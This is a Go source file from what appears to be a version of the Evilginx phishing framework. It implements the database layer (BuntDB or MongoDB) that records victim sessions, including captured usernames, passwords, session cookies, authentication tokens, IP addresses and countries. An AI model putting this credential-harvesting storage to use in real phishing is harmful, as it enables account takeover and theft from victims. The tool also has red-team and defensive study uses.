package database

import (
	"encoding/json"
	"strconv"

	"github.com/tidwall/buntdb"
)

type Database struct {
	path string
	db   *buntdb.DB
	impl IDatabase
}

func NewDatabase(path string) (*Database, error) {
	var err error
	d := &Database{path: path}

	if len(path) > 8 && path[:8] == "mongo://" {
		mongoUri := path
		mongoDb, err := NewMongoDatabase(mongoUri, "evilginx")
		if err != nil {
			return nil, err
		}
		d.impl = mongoDb
		return d, nil
	} else {
		d.db, err = buntdb.Open(path)
		if err != nil {
			return nil, err
		}
		d.sessionsInit()
		d.db.Shrink()
		d.impl = (*BuntDatabase)(d)
		return d, nil
	}
}

func (d *Database) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	return d.impl.CreateSession(sid, phishlet, landing_url, useragent, remote_addr)
}

func (d *Database) ListSessions() ([]*Session, error) {
	return d.impl.ListSessions()
}

func (d *Database) SetSessionUsername(sid string, username string) error {
	return d.impl.SetSessionUsername(sid, username)
}

func (d *Database) SetSessionPassword(sid string, password string) error {
	return d.impl.SetSessionPassword(sid, password)
}

func (d *Database) SetSessionCustom(sid string, name string, value string) error {
	return d.impl.SetSessionCustom(sid, name, value)
}

func (d *Database) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	return d.impl.SetSessionBodyTokens(sid, tokens)
}

func (d *Database) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	return d.impl.SetSessionHttpTokens(sid, tokens)
}

func (d *Database) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
	return d.impl.SetSessionCookieTokens(sid, tokens, bodyTokens, httpTokens)
}

func (d *Database) SetSessionCountryInfo(sid string, countryCode string, country string) error {
	return d.impl.SetSessionCountryInfo(sid, countryCode, country)
}

func (d *Database) DeleteSession(sid string) error {
	return d.impl.DeleteSession(sid)
}

func (d *Database) DeleteSessionById(id int) error {
	return d.impl.DeleteSessionById(id)
}

func (d *Database) Flush() {
	d.impl.Flush()
}

func (d *Database) genIndex(table_name string, id int) string {
	return table_name + ":" + strconv.Itoa(id)
}

func (d *Database) getLastId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.View(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err != nil {
			return err
		}
		if id, err = strconv.Atoi(s_id); err != nil {
			return err
		}
		return nil
	})
	return id, err
}

func (d *Database) getNextId(table_name string) (int, error) {
	var id int = 1
	var err error
	err = d.db.Update(func(tx *buntdb.Tx) error {
		var s_id string
		if s_id, err = tx.Get(table_name + ":0:id"); err == nil {
			if id, err = strconv.Atoi(s_id); err != nil {
				return err
			}
		}
		tx.Set(table_name+":0:id", strconv.Itoa(id+1), nil)
		return nil
	})
	return id, err
}

func (d *Database) getPivot(t interface{}) string {
	pivot, _ := json.Marshal(t)
	return string(pivot)
}

func (d *Database) Close() error {
	return d.impl.Close()
}

func (d *Database) GetSessionById(id int) (*Session, error) {
	return d.impl.GetSessionById(id)
}

func (d *Database) GetSessionBySid(sid string) (*Session, error) {
	return d.impl.GetSessionBySid(sid)
}

type BuntDatabase Database

func (b *BuntDatabase) CreateSession(sid string, phishlet string, landing_url string, useragent string, remote_addr string) error {
	return (*Database)(b).sessionsCreate(sid, phishlet, landing_url, useragent, remote_addr)
}

func (b *BuntDatabase) ListSessions() ([]*Session, error) {
	return (*Database)(b).sessionsList()
}

func (b *BuntDatabase) SetSessionUsername(sid string, username string) error {
	return (*Database)(b).sessionsUpdateUsername(sid, username)
}

func (b *BuntDatabase) SetSessionPassword(sid string, password string) error {
	return (*Database)(b).sessionsUpdatePassword(sid, password)
}

func (b *BuntDatabase) SetSessionCustom(sid string, name string, value string) error {
	return (*Database)(b).sessionsUpdateCustom(sid, name, value)
}

func (b *BuntDatabase) SetSessionBodyTokens(sid string, tokens map[string]string) error {
	return (*Database)(b).sessionsUpdateBodyTokens(sid, tokens)
}

func (b *BuntDatabase) SetSessionHttpTokens(sid string, tokens map[string]string) error {
	return (*Database)(b).sessionsUpdateHttpTokens(sid, tokens)
}

func (b *BuntDatabase) SetSessionCookieTokens(sid string, tokens map[string]map[string]*CookieToken, bodyTokens map[string]string, httpTokens map[string]string) error {
	return (*Database)(b).sessionsUpdateCookieTokens(sid, tokens)
}

func (b *BuntDatabase) SetSessionCountryInfo(sid string, countryCode string, country string) error {
	return (*Database)(b).sessionsUpdateCountryInfo(sid, countryCode, country)
}

func (b *BuntDatabase) DeleteSession(sid string) error {
	s, err := (*Database)(b).sessionsGetBySid(sid)
	if err != nil {
		return err
	}
	return (*Database)(b).sessionsDelete(s.Id)
}

func (b *BuntDatabase) DeleteSessionById(id int) error {
	_, err := (*Database)(b).sessionsGetById(id)
	if err != nil {
		return err
	}
	return (*Database)(b).sessionsDelete(id)
}

func (b *BuntDatabase) Flush() {
	(*Database)(b).db.Shrink()
}

func (b *BuntDatabase) Close() error {
	if (*Database)(b).db != nil {
		return (*Database)(b).db.Close()
	}
	return nil
}

func (b *BuntDatabase) GetSessionById(id int) (*Session, error) {
	return (*Database)(b).sessionsGetById(id)
}

func (b *BuntDatabase) GetSessionBySid(sid string) (*Session, error) {
	return (*Database)(b).sessionsGetBySid(sid)
}
